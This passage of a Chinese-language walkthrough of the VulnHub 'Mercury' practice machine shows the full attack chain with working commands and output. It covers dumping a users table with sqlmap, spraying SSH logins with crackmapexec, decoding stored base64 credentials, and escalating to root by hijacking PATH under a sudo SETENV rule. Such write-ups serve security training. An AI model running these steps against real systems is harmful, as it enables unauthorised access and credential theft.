users</code>。<code>Ox7c</code>是’|’的hex值，主要是我们加进来为了分割一下结果。<br class='item-img' data-src='/pic/assets/1684917352986-d4faa9e2-c552-40bd-afc4-7ce02492e992.png'><img src="/pic/assets/1684917352986-d4faa9e2-c552-40bd-afc4-7ce02492e992.png" alt="union-getuser.png"><br>可以发现结果已经出来了。</p>
<h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>用sqlmap也可以，很快。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.103:8080/mercuryfacts/ 

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.103:8080/mercuryfacts/ --dbs

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury --tables

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T <span class="token function">users</span> --columns

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T <span class="token function">users</span> --dump
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们将获得的结果存进一个文件里并简单处理下存进两个txt文件中供之后尝试ssh登录备用。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> rawdata 
+----+-------------------------------+-----------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password                      <span class="token operator">|</span> username  <span class="token operator">|</span>
+----+-------------------------------+-----------+
<span class="token operator">|</span> 1  <span class="token operator">|</span> johnny1987                    <span class="token operator">|</span> john      <span class="token operator">|</span>
<span class="token operator">|</span> 2  <span class="token operator">|</span> lovemykids111                 <span class="token operator">|</span> laura     <span class="token operator">|</span>
<span class="token operator">|</span> 3  <span class="token operator">|</span> lovemybeer111                 <span class="token operator">|</span> sam       <span class="token operator">|</span>
<span class="token operator">|</span> 4  <span class="token operator">|</span> mercuryisthesizeof0.056Earths <span class="token operator">|</span> webmaster <span class="token operator">|</span>
+----+-------------------------------+-----------+

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> rawdata <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">'|'</span> <span class="token string">'&amp;#123;print <span class="token variable">$3</span>&amp;#125;'</span> 

 password                      

 johnny1987                    
 lovemykids111                 
 lovemybeer111                 
 mercuryisthesizeof0.056Earths 
 
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> rawdata <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">'|'</span> <span class="token string">'&amp;#123;print <span class="token variable">$3</span>&amp;#125;'</span> <span class="token operator">></span> pass.txt
                                                                                                                             
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> rawdata <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">'|'</span> <span class="token string">'&amp;#123;print <span class="token variable">$4</span>&amp;#125;'</span> <span class="token operator">></span> username.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> crackmapexec <span class="token function">ssh</span> 192.168.56.103 -u username.txt -p pass.txt --continue-on-success
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>*<span class="token punctuation">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john:johnny1987 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john:lovemykids111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john:lovemybeer111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john:mercuryisthesizeof0.056Earths Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> john: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura:johnny1987 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura:lovemykids111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura:lovemybeer111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura:mercuryisthesizeof0.056Earths Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> laura: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam:johnny1987 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam:lovemykids111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam:lovemybeer111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam:mercuryisthesizeof0.056Earths Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> sam: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> webmaster:johnny1987 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> webmaster:lovemykids111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> webmaster:lovemybeer111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>+<span class="token punctuation">]</span> webmaster:mercuryisthesizeof0.056Earths 
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> webmaster: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> webmaster: Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> :johnny1987 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> :lovemykids111 Authentication failed.
SSH         192.168.56.103  22     192.168.56.103   <span class="token punctuation">[</span>-<span class="token punctuation">]</span> :lovemybeer111 Authentication failed.
^C

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Shutting down, please wait<span class="token punctuation">..</span>.
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现有可以成功登录的凭证，懒得等他跑完了，直接登录吧。</p>
<h2 id="Priv-Esca"><a href="#Priv-Esca" class="headerlink" title="Priv Esca"></a>Priv Esca</h2><pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/mercury/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">ssh</span> webmaster@192.168.56.103                                                          
The authenticity of host <span class="token string">'192.168.56.103 (192.168.56.103)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>192.168.56.103<span class="token string">' (ED25519) to the list of known hosts.
webmaster@192.168.56.103'</span>s password: 
Welcome to Ubuntu 20.04.1 LTS <span class="token punctuation">(</span>GNU/Linux 5.4.0-45-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 23 May 17:02:38 UTC 2023

  System load:  0.0               Processes:               106
  Usage of /:   74.9% of 4.86GB   Users logged in:         0
  Memory usage: 30%               IPv4 address <span class="token keyword">for</span> enp0s3: 192.168.56.103
  Swap usage:   0%


22 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136
webmaster@mercury:~$ <span class="token function">whoami</span>
webmaster
webmaster@mercury:~$ <span class="token function">pwd</span>
/home/webmaster
webmaster@mercury:~/mercury_proj$ <span class="token function">sudo</span> -l
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> webmaster: 
Sorry, user webmaster may not run <span class="token function">sudo</span> on mercury.
webmaster@mercury:~$ <span class="token function">ls</span> -la
total 36
drwx------ 4 webmaster webmaster 4096 Sep  2  2020 <span class="token keyword">.</span>
drwxr-xr-x 5 root      root      4096 Aug 28  2020 <span class="token punctuation">..</span>
lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout
-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrc
drwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cache
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile
-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ <span class="token function">cat</span> user_flag.txt 
<span class="token punctuation">[</span>user_flag_8339915c9a454657bd60ee58776f4ccd<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>拿到了user_flag。</p>
<pre class="line-numbers language-bash"><code class="language-bash">webmaster@mercury:~$ <span class="token function">cat</span> .bash_history 
webmaster@mercury:~$ <span class="token function">cd</span> mercury_proj/
webmaster@mercury:~/mercury_proj$ <span class="token function">ls</span> -la
total 28
drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 <span class="token keyword">.</span>
drwx------ 4 webmaster webmaster 4096 Sep  2  2020 <span class="token punctuation">..</span>
-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3
-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py
drwxrwxr-x 6 webmaster webmaster 4096 Sep  1  2020 mercury_facts
drwxrwxr-x 4 webmaster webmaster 4096 Aug 28  2020 mercury_index
drwxrwxr-x 3 webmaster webmaster 4096 Aug 28  2020 mercury_proj
-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt
webmaster@mercury:~/mercury_proj$ <span class="token function">cat</span> notes.txt 
Project accounts <span class="token punctuation">(</span>both restricted<span class="token punctuation">)</span>:
webmaster <span class="token keyword">for</span> web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster <span class="token keyword">for</span> linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg<span class="token operator">==</span>
webmaster@mercury:~/mercury_proj$ <span class="token function">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mercury:x:1000:1000:mercury:/home/mercury:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash
linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先看看bash history，没内容。那么我们看看网页目录下有啥，有个notes.txt。查看一下，里面好像存了一个linuxmaster的登录凭证的base64编码。我们<code>cat /etc/passwd</code>确定确实有该用户，那我们<code>echo &#39;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#39; | base64 -d</code>解码一下尝试登录看看能不能成。</p>
<pre class="line-numbers language-bash"><code class="language-bash">webmaster@mercury:~/mercury_proj$ <span class="token function">su</span> linuxmaster
Password: 
linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="token function">sudo</span> -l
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> linuxmaster: 
Matching Defaults entries <span class="token keyword">for</span> linuxmaster on mercury:
    env_reset, mail_badpass, secure_path<span class="token operator">=</span>/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    <span class="token punctuation">(</span>root <span class="token keyword">:</span> root<span class="token punctuation">)</span> SETENV: /usr/bin/check_syslog.sh
linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="token function">cat</span> /usr/bin/check_syslog.sh
<span class="token comment" spellcheck="true">#!/bin/bash</span>
<span class="token function">tail</span> -n 10 /var/log/syslog
linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="token function">ls</span> -la /usr/bin/check_syslog.sh
-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现成功登录，查看<code>sudo -l</code>发现此用户可以以root身份无密码运行<code>/usr/bin/check_syslog.sh</code>且有<code>SETENV</code>权限。我们查看<code>check_syslog.sh</code>的内容，发现就是用tail查看下系统日志。<br>值得注意的是，这里的tail是用相对路径而不是绝对路径写的，所以系统执行时从PATH中寻找的。正好此用户有<code>SETENV</code>的权限，那我们的提权思路就很明确了：我们伪造一个tail，并把其位置写在PATH前面，因为系统执行是从前往后寻找的，这样我们就能以root权限执行我们先要执行的命令了。</p>
<pre class="line-numbers language-bash"><code class="language-bash">linuxmaster@mercury:/tmp$ <span class="token keyword">echo</span> <span class="token string">'/bin/bash -p'</span> <span class="token operator">></span> <span class="token function">tail</span>
linuxmaster@mercury:/tmp$ <span class="token function">chmod</span> +xs <span class="token function">tail</span> 
linuxmaster@mercury:/tmp$ <span class="token function">ls</span> -la
total 48
drwxrwxrwt 10 root        root        4096 May 23 17:10 <span class="token keyword">.</span>
drwxr-xr-x 19 root        root        4096 Sep  1  2020 <span class="token punctuation">..</span>
-rwxr-xr-x  1 linuxmaster linuxmaster   39 May 23 17:05 backup
drwxrwxrwt  2 root        root        4096 May 23 13:14 .font-unix
drwxrwxrwt  2 root        root        4096 May 23 13:14 .ICE-unix
drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-logind.service-Pum4tf                                                                                                                    
drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-resolved.service-OBDWgg                                                                                                                  
drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-timesyncd.service-mA1HTi                                                                                                                 
-rwsrwsr-x  1 linuxmaster linuxmaster   13 May 23 17:10 <span class="token function">tail</span>
drwxrwxrwt  2 root        root        4096 May 23 13:14 .Test-unix
drwxrwxrwt  2 root        root        4096 May 23 13:14 .X11-unix
drwxrwxrwt  2 root        root        4096 May 23 13:14 .XIM-unix
linuxmaster@mercury:/tmp$ <span class="token function">export</span> PATH<span class="token operator">=</span>/tmp:<span class="token variable">$PATH</span>
linuxmaster@mercury:/tmp$ <span class="token keyword">echo</span> <span class="token variable">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
linuxmaster@mercury:/tmp$ <span class="token function">sudo</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span> /usr/bin/check_syslog.sh 
root@mercury:/tmp<span class="token comment" spellcheck="true"># whoami</span>
root
root@mercury:/tmp<span class="token comment" spellcheck="true"># ip a</span>
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:80:e5:a9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 584sec preferred_lft 584sec
    inet6 fe80::a00:27ff:fe80:e5a9/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
root@mercury:/tmp<span class="token comment" spellcheck="true"># uname -a</span>
Linux mercury 5.4.0-45-generic <span class="token comment" spellcheck="true">#49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
root@mercury:/tmp<span class="token comment" spellcheck="true"># exit</span>
<span class="token keyword">exit</span>
linuxmaster@mercury:/tmp$ <span class="token function">sudo</span> --preserve-env<span class="token operator">=</span>PATH /usr/bin/check_syslog.sh 
root@mercury:/tmp<span class="token comment" spellcheck="true"># id</span>
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@mercury:/tmp<span class="token comment" spellcheck="true"># cd ~</span>
root@mercury:~<span class="token comment" spellcheck="true"># ls -la</span>
total 56
drwx------  5 root root 4096 Sep  2  2020 <span class="token keyword">.</span>
drwxr-xr-x 19 root root 4096 Sep  1  2020 <span class="token punctuation">..</span>
-rw-------  1 root root 3214 May 23 17:14 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Aug 27  2020 .cache
-rw-------  1 root root   34 Sep  1  2020 .lesshst
drwxr-xr-x  3 root root 4096 Aug 28  2020 .local
-rw-------  1 root root 3619 Sep  1  2020 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root 1228 Sep  2  2020 root_flag.txt
drwx------  2 root root 4096 Aug 27  2020 .ssh
-rw-------  1 root root 9454 Sep  2  2020 .viminfo
root@mercury:~<span class="token comment" spellcheck="true"># cat root_flag.txt </span>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/<span class="token comment" spellcheck="true">##////////@@@@@@@@@@@@@@@@@@@@</span>
@@@@@@@@@@@@@@<span class="token punctuation">((</span><span class="token punctuation">(</span>/<span class="token punctuation">(</span>*<span class="token punctuation">(</span>/<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span>////////<span class="token operator">&amp;</span>@@@@@@@@@@@@@
@@@@@@@@@@@<span class="token punctuation">((</span><span class="token comment" spellcheck="true">#(#(###((##//(((/(/(((*((//@@@@@@@@@@</span>
@@@@@@@@/<span class="token comment" spellcheck="true">#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@</span>
@@@@@@*<span class="token punctuation">((</span><span class="token comment" spellcheck="true">####((///*//(///*(/*//((/(((//**/((&amp;@@@@@</span>
@@@@@/<span class="token punctuation">(</span>/<span class="token punctuation">((</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">##/*((//(#(////(((((/(///(((((///(*@@@@</span>
@@@@/<span class="token punctuation">(</span>//<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment" spellcheck="true">#(((((*///*/(/(/(((/((////(/*/*(///@@@</span>
@@@//**/<span class="token punctuation">(</span>/<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#(#(##((/(((((/(**//////////((//((*/#@@</span>
@@@<span class="token punctuation">(</span>//<span class="token punctuation">(</span>/<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment" spellcheck="true">#((((#*/((///((///((//////(/(/(*(/@@</span>
@@@<span class="token punctuation">((</span>//<span class="token punctuation">((</span><span class="token punctuation">((</span>/<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment" spellcheck="true">#(/(/((/(/(((((#((((((/(/((/////@@</span>
@@@<span class="token punctuation">((</span><span class="token punctuation">(</span>/<span class="token punctuation">((</span><span class="token punctuation">(</span>/<span class="token comment" spellcheck="true">##((#((/*///((/((/((##((/(/(/((((((/*@@</span>
@@@<span class="token punctuation">((</span><span class="token punctuation">(</span>/<span class="token punctuation">(</span><span class="token comment" spellcheck="true">##/#(((##((/((((((/(##(/##(#((/((((#((*%@@</span>
@@@@<span class="token punctuation">(</span>///<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#(((((#(#(((((#(//((#((###((/(((((/(//@@@</span>
@@@@@<span class="token punctuation">(</span>/*/<span class="token punctuation">(</span><span class="token comment" spellcheck="true">##(/(###(((#((((/((####/((((///((((/@@@@</span>
@@@@@@%//<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment" spellcheck="true">#############((((/((/(/(*/(((((@@@@@@</span>
@@@@@@@@%<span class="token comment" spellcheck="true">#(((############(##((#((*//(/(*//@@@@@@@@</span>
@@@@@@@@@@@/<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#(####(###/((((((#(///((//(@@@@@@@@@@</span>
@@@@@@@@@@@@@@@<span class="token punctuation">((</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">###((#(#(((/((///*@@@@@@@@@@@@@@</span>
@@@@@@@@@@@@@@@@@@@@@@@%<span class="token comment" spellcheck="true">#(#%@@@@@@@@@@@@@@@@@@@@@@</span>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
If you have any feedback please contact me at SirFlash@protonmail.com
<span class="token punctuation">[</span>root_flag_69426d9fda579afbffd9c2d47ca31d90<span class="token punctuation">]</span>
root@mercury:~<span class="token comment" spellcheck="true">#</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从上面的操作，我们可以看出对于<code>SETENV</code>权限，我们可以通过<code>sudo PATH=$PATH /usr/bin/check_syslog.sh </code>或<code>sudo --preserve-env=PATH /usr/bin/check_syslog.sh</code>两种方式强制以当前用户PATH执行。</p>
